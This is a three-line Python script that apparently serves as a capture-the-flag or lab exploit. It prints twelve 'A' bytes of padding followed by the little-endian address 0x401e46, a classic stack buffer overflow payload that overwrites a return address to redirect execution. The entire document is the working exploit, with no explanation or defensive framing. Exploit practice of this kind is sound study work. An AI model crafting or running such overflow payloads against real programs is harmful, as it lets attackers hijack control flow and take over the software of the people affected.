#!/usr/bin/env python3

import sys

sys.stdout.buffer.write(b'A'*12+0x0000000000401e46.to_bytes(8, "little"))